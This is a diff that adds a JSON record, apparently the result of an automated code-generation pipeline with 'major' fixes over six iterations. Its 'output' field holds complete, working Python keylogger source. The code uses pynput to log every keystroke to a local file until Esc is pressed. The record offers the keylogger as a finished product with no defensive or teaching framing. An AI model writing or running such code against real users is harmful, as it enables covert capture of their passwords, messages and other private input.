@@ -1,0 +1,8 @@
+{
+  "output": "import pynput\nfrom pynput import keyboard\n\ndef on_press(key):\n    try:\n        with open('keylogs.txt', 'a') as keylog_file:\n            if key == keyboard.Key.space:\n                keylog_file.write(' [SPACE]')\n            elif key == keyboard.Key.enter:\n                keylog_file.write('\\n[ENTER]\\n')\n            else:\n                char = str(key).strip(\"'\")\n                keylog_file.write(char)\n    except Exception as e:\n        print(f'An error occurred: {e}')\ndef on_release(key):\n    if key == keyboard.Key.esc:\n        return False\nwith keyboard.Listener(on_press=on_press, on_release=on_release) as listener:\n    listener.join()",
+  "notes": "",
+  "applied_fixes": [
+    "major"
+  ],
+  "iterations": 6
+}
